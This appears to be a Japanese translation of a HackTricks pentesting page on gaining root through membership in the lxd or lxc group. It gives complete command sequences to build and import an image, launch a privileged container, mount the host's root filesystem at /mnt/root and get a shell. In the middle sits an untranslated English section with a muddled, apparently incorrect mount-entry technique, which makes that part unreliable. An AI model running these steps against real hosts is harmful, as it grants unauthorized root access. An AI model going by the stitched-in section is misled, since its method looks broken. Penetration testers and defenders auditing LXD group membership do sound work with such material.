<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ会社**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**最新バージョンのPEASSを入手したり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください**。

</details>


もし _**lxd**_ **または** _**lxc**_ **グループに所属している場合、rootになることができます**

# インターネットなしでの攻撃

あなたのマシンにこのディストロビルダーをインストールすることができます：[https://github.com/lxc/distrobuilder ](https://github.com/lxc/distrobuilder)\(githubの指示に従ってください\)：
```bash
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
cd
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```
次に、サーバーに**lxd.tar.xz**と**rootfs.squashfs**というファイルをアップロードします。

イメージを追加します：
```bash
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image
```
# LXD Privilege Escalation

## Introduction

LXD is a container hypervisor that allows users to run multiple Linux distributions on a single host. However, misconfigurations in LXD can lead to privilege escalation, allowing an attacker to gain root access on the host system.

In this guide, we will explore various techniques to escalate privileges in LXD containers.

## Container Creation

To create a container, use the following command:

```bash
lxc launch <image> <container-name>
```

Replace `<image>` with the desired Linux distribution image and `<container-name>` with the name you want to give to the container.

## Adding Root Path

To escalate privileges in LXD, we can add the root path of the host system to the container's configuration. This will allow us to access and modify sensitive files on the host.

To add the root path, follow these steps:

1. First, find the root path of the host system by running the following command:

   ```bash
   lxc config show <container-name> | grep volatile.rootfs
   ```

   This will display the root path in the output.

2. Next, edit the container's configuration file by running the following command:

   ```bash
   lxc config edit <container-name>
   ```

3. In the configuration file, locate the `config` section and add the following line:

   ```yaml
   raw.lxc: |-
     lxc.mount.entry = /<root-path> /var/lib/lxc/<container-name>/rootfs none bind,optional,create=dir 0 0
   ```

   Replace `<root-path>` with the root path obtained in step 1 and `<container-name>` with the name of the container.

4. Save the configuration file and exit the editor.

5. Restart the container for the changes to take effect:

   ```bash
   lxc restart <container-name>
   ```

After adding the root path, you can access and modify files on the host system from within the container, effectively escalating privileges.

## Conclusion

By adding the root path of the host system to an LXD container's configuration, an attacker can escalate privileges and gain unauthorized access to sensitive files. It is crucial to properly configure and secure LXD to prevent such privilege escalation attacks.
```bash
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```
コンテナを実行します：
```bash
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# インターネットを使用する場合

[こちらの手順](https://reboare.github.io/lxd/lxd-escape.html)に従うことができます。
```bash
lxc init ubuntu:16.04 test -c security.privileged=true
lxc config device add test whatever disk source=/ path=/mnt/root recursive=true
lxc start test
lxc exec test bash
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
# その他の参考資料

{% embed url="https://reboare.github.io/lxd/lxd-escape.html" caption="" %}



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンやHackTricksのPDFをダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
